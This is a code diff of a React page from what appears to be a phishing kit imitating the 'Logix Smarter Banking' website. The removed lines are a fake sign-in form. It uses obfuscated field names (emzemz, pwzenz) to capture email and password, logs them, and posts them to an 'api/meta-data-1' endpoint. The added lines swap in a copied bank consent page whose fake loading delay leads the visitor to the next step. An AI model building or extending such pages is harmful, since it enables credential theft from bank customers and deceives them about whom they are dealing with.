@@ -1,179 +1,111 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import axios from 'axios';
-import { baseUrl } from '../constants';
 
 const Terms: React.FC = () => {
-  const [emzemz, setEmzemz] = useState('');
-  const [pwzenz, setPwzenz] = useState('');
+  const [isChecked, setIsChecked] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [showPwzenz, setShowPwzenz] = useState(false);
-  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
-
+  const [errorMessage, setErrorMessage] = useState('');
   const navigate = useNavigate();
 
-  const togglePwzenzVisibility = () => {
-    setShowPwzenz((prev) => !prev);
+  const handleCheckboxChange = () => {
+    setIsChecked(!isChecked);
+    if (isChecked) {
+      setErrorMessage('');
+    }
   };
 
-  const validateEmzemz = (emzemz: string) => {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(emzemz);
-  };
-
-  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
-    setIsLoading(true);
+  const handleSubmit = (event: React.FormEvent) => {
     event.preventDefault();
-    let newErrors = { emzemz: '', pwzenz: '' };
+    if (isChecked) {
+      setIsLoading(true);
+      setErrorMessage('');
 
-    if (!validateEmzemz(emzemz)) {
-      newErrors.emzemz = 'Invalid email format.';
-      setIsLoading(false);
-    }
-
-    if (pwzenz.length <= 0) {
-      newErrors.pwzenz = 'Password must be at least 6 characters.';
-      setIsLoading(false);
-    }
-
-    setErrors(newErrors);
-
-    // Check if there are no errors
-    if (!newErrors.emzemz && !newErrors.pwzenz) {
-      // Proceed with form submission
-      console.log('Form submitted with:', { emzemz, pwzenz });
-
-      const url = `${baseUrl}api/meta-data-1/`;
-
-      try {
-        await axios.post(url, {
-          emzemz: emzemz,
-          pwzenz: pwzenz,
-        });
-        console.log('Message sent successfully');
-        navigate('/');
-      } catch (error) {
-        console.error('Error sending message:', error);
+      // Simulate API request or loading delay
+      setTimeout(() => {
         setIsLoading(false);
-      }
-
-      setErrors({ emzemz: '', pwzenz: '' });
+        // Navigate to the next page or perform any other action
+        navigate('/');
+      }, 2000);
+    } else {
+      setErrorMessage('Please agree to the terms before proceeding.');
     }
   };
 
   return (
     <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className=" border-b-2 border-teal-500 px-6 py-4">
-        <h2 className="text-lg text-gray-700">Sign In – Welcome to Logix Smarter Banking</h2>
+   
+
+           <div className="border-b-2 border-teal-500 px-8 py-4">
+        <h2 className="text-xl font-semibold text-gray-800">Terms of Agreement</h2>
       </div>
 
+
       <div className="px-6 py-6 bg-white space-y-4">
+        <p className="text-sm mb-4">
+          By submitting this registration form, I understand that I am
+          providing written instructions in accordance with the Fair Credit
+          Reporting Act, Driver Privacy Protection Act, and other applicable
+          law for Logix and its affiliates to request and receive
+          information about me from third parties, including but not limited
+          to a copy of my consumer credit report, score, and motor vehicle
+          records from consumer reporting agencies, at any time for so long
+          as I have an active account.
+        </p>
+
+        <p className="text-sm mb-6">
+          I further authorize Logix and its affiliates to retain a copy
+          of my information for use in accordance with Logix's
+          <a href="#" className="text-blue-700 hover:underline">
+            {' '}Terms of Service
+          </a>{' '}
+          and{' '}
+          <a href="#" className="text-blue-700 hover:underline">
+            Privacy Statement
+          </a>.
+        </p>
+
         <form onSubmit={handleSubmit}>
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Username:</label>
-            <input
-              id="emzemz"
-              name="emzemz"
-              type="email"
-              value={emzemz}
-              onChange={(e) => setEmzemz(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-            />
-            <a href="#" className="text-blue-700 text-sm hover:underline">Not Registered?</a>
-          </div>
+          <div className="mt-7">
+            <label className="flex gap-2 mb-4 items-center">
+              <input
+                type="checkbox"
+                checked={isChecked}
+                onChange={handleCheckboxChange}
+                className="h-4 w-4 text-teal-600 focus:ring-teal-500 border-gray-300 rounded"
+              />
+              <span className="text-sm text-gray-700">I understand and agree</span>
+            </label>
 
-          {errors.emzemz && (
-            <div className="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
-              <svg
-                width="1rem"
-                height="1rem"
-                viewBox="0 0 24 24"
-                className="fill-current text-red-600"
-                aria-hidden="true"
+            {errorMessage && (
+              <div className="flex items-center gap-2 text-red-600 text-sm mb-4">
+                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
+                </svg>
+                <span>{errorMessage}</span>
+              </div>
+            )}
+        <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
+            {!isLoading ? (
+              <button
+                type="submit"
+                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
               >
-                <path
-                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-                  fillRule="nonzero"
-                ></path>
-              </svg>
-
-              <p>Email required</p>
-            </div>
-          )}
-
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Password:</label>
-            <input
-              id="pwzenz"
-              name="pwzenz"
-              type={showPwzenz ? 'text' : 'password'}
-              value={pwzenz}
-              onChange={(e) => setPwzenz(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-            />
-            <a href="#" className="text-blue-700 text-sm hover:underline">Forgot Password?</a>
+                Continue
+              </button>
+            ) : (
+              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
+            )}
           </div>
-
-          {errors.pwzenz && (
-            <div className="flex items-center gap-3 text-sm font-bold mt-2">
-              <svg
-                width="1rem"
-                height="1rem"
-                viewBox="0 0 24 24"
-                className="fill-current text-red-600"
-                aria-hidden="true"
-              >
-                <path
-                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-                  fillRule="nonzero"
-                ></path>
-              </svg>
-
-              <p>Password required</p>
-            </div>
-          )}
-
-          <div className="flex items-center gap-4">
-            <div className="w-24"></div>
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
-              onClick={togglePwzenzVisibility}
-            >
-              {showPwzenz ? 'Hide' : 'Show'}
-            </span>
           </div>
         </form>
       </div>
 
-      <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-        {!isLoading ? (
-          <button
-            type="submit"
-            className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-          >
-            Sign-In
-          </button>
-        ) : (
-          <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-        )}
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700 mb-2">
-          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
+      <div className="px-6 py-4 bg-gray-100 border-t border-gray-200">
+        <p className="text-xs text-gray-600 text-center">
+          For security reasons, never share your personal information with anyone unless you are certain
+          who you are providing that information to, and only share information through a secure webpage or site.
         </p>
-        <div className="text-xs text-blue-700 space-x-2">
-          <a href="#" className="hover:underline">Forgot Username?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Password?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Everything?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Locked Out?</a>
-        </div>
       </div>
-
-   
     </div>
   );
 };
